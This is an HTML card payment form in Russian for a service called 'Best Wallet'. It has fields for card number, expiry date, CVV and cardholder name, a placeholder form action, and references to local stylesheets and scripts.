<!doctype html><html><head><meta charset="utf-8"><title>Best Wallet - форма оплаты</title><meta name="viewport" content="maximum-scale=1,width=device-width,user-scalable=no,minimal-ui"><link rel="stylesheet" href="/mbank.web.paymentform/css/screen.css"></head><body><div class="wrapper"><div class="screen"><div class="screen__in"><div class="screen__bg"><div class="addcard"><div class="info"><div class="info__ico"><span>$</span></div><div class="info__in"><p>После нажатия кнопки «Продолжить» мы снимем с указанной карты <b></b> для оплаты выбранной услуги.</p></div></div><form class="payment__form" method="post" action="endpoint" name="payment_page"><div class="addcard__in"><div class="field"><div class="field__label">Номер карты</div><div class="field__el"><input class="input" placeholder="•••• •••• •••• ••••" name="pan" type="text" data-validate-rule="card-number" required pattern="\d*" data-validate-filter="[\s\-]*" minlength="16" maxlength="19" autocomplete="cc-number" x-autocompletetype="cc-number" inputmode="numeric" id="cardNumber"><div class="paysys"><i class="icon-card-front"></i></div></div></div><div class="fieldset"><div class="field field_double field_issued_at"><div class="field__label">Срок действия</div><div class="field__el"><input class="input" name="exp_date_m" placeholder="MM" min="1" max="12" pattern="\d*" type="number" maxlength="2" required autocomplete="cc-exp-month" x-autocompletetype="cc-exp-month" inputmode="numeric" id="cardExpirationMonth"></div><div class="field__el"><input class="input" name="exp_date_y" placeholder="ГГГГ" min="2015" max="2027" pattern="\d*" type="number" minlength="4" maxlength="4" required autocomplete="cc-exp-year" x-autocompletetype="cc-exp-year" inputmode="numeric" id="cardExpirationYear"></div></div><div class="field field_right field_secure"><div class="field__label">Код CVV</div><div class="field__el"><input class="input" name="cvv" placeholder="•••" min="0" max="999" type="number" minlength="3" pattern="\d*" maxlength="3" required autocomplete="cc-csc" x-autocompletetype="cc-csc" inputmode="numeric"></div></div><label for="cvv" class="icon icon-card-back"></label></div><div class="field field__cardholder"><div class="field__label">Держатель карты</div><div class="field__el"><input class="input" name="cardholder" placeholder="IVAN IVANOV" type="text" required minlength="3" autocomplete="cc-name" x-autocompletetype="cc-name" inputmode="latin-name" id="cardName"></div><div class="field__notice">Латинскими буквами как указано на карте</div></div></div><div class="iframe_inputs">      </div><div class="info"><div class="info__ico"><i class="icon icon-lock"></i></div><div class="info__in"><p>Передача данных шифруется высоконадежным 256-битным алгоритмом и осуществляется посредством SSL протокола</p></div></div><div class="form"><button class="btn btn_submit btn_red" type="submit">Продолжить</button></div><ul class="provider-icons"><li><i class="icon-partner-visa"></i></li><li><i class="icon-partner-mastercard"></i></li><li><i class="icon-partner-visa-verified"></i></li><li><i class="icon-partner-pci-dss"></i></li></ul></form></div></div></div></div></div><div class="toast"><div class="toast__in"><div class="toast__icon"><div class="toast__icon__in"><i class="icon icon-ok"></i></div></div><div class="toast__content"></div></div></div><link rel="stylesheet" href="/mbank.web.paymentform/css/icons.css"><script src="/mbank.web.paymentform/js/lang/RU/strings.js"></script><script src="/mbank.web.paymentform/js/all.js"></script></body></html>
